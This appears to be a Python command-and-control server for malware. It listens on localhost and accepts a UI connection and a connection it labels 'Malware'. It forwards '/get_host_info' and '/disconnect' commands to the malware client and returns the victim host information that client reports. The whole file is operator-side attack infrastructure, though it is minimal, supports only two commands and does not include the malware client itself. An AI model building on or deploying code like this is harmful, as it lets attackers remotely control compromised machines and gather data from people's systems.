import socket
import logging
import json

logging.basicConfig(level=logging.INFO)

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 65432

BUFFER_SIZE = 2048


def listen_to_ui(ui_conn: socket.socket, malware_conn: socket.socket):
    command_table = {
        '/get_host_info': request_host_info,
        '/disconnect': request_disconnect
    }
    while True:
        command = ui_conn.recv(BUFFER_SIZE).decode('utf-8')
        command_fn = command_table.get(command)

        if command_fn is None:
            logging.warning(f'Invalid command {command} received')
            continue

        try:
            command_result = command_fn(conn=malware_conn)
            ui_conn.sendall(command_result)
            logging.info(f'Command_result sent to ui')
        except ConnectionResetError as e:
            logging.warning('Request was not sent, No active connection found')


def byte_json_string_to_dict(data: bytes) -> dict:
    return json.loads(data.decode('utf-8'))


def request_host_info(conn: socket.socket) -> bytes:
    conn.sendall(b'/get_host_info')
    logging.info(f'command `/get_host_info` sent')
    host_info_bytes = conn.recv(BUFFER_SIZE)
    host_info = byte_json_string_to_dict(host_info_bytes)
    host_info_json_str = json.dumps(host_info, indent=4, ensure_ascii=False)
    logging.info(f'host_info received: {host_info_json_str}')
    return host_info_json_str.encode('utf-8')


def request_disconnect(conn: socket.socket) -> bytes:
    conn.sendall(b'/disconnect')
    logging.info(f'command `/disconnect` sent')
    return b'Disconnected'


def listen():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen()
        logging.info(f"listening on {SERVER_HOST}:{SERVER_PORT}")

        ui_conn, ui_addr = s.accept()
        logging.info(f"UI Connected by {ui_addr}")

        malware_conn, malware_addr = s.accept()
        logging.info(f"Malware Connected by {malware_addr}")

        listen_to_ui(ui_conn, malware_conn)


def serve():
    listen()


if __name__ == '__main__':
    serve()
